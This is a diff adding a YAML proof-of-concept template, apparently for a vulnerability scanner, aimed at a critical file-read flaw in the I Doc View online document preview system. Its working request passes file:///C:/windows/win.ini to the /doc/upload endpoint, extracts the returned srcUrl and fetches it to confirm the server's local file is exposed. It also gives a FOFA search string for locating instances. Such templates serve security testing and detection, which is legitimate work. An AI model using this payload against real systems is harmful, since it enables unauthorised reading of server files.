@@ -1,0 +1,34 @@
+id: poc-yaml-i-doc-view-online-doc-upload-file-read
+info:
+  name: I Doc View在线文档预览系统 doc-upload 文件读取漏洞
+  severity: critical
+  tags:
+  - 文件读取
+  finger: I Doc View
+  fofa: I Doc View在线文档预览
+variables:
+  t1: random_str(3)
+requests:
+- method: GET
+  path: /doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name={{.t1}}.txt
+  expression: 'status_code == 200
+
+    && contains(body,"srcUrl")
+
+    && contains(headers,"idocv")
+
+    '
+  output:
+  - regex_match(body,"\"srcUrl\":\"(?P<url>([^\"]*))")
+- method: GET
+  path: '{{.url}}'
+  expression: 'status_code == 200
+
+    && contains(body,"[fonts]")
+
+    && contains(body,"[files]")
+
+    && !contains(body,"<")
+
+    '
+transport: http
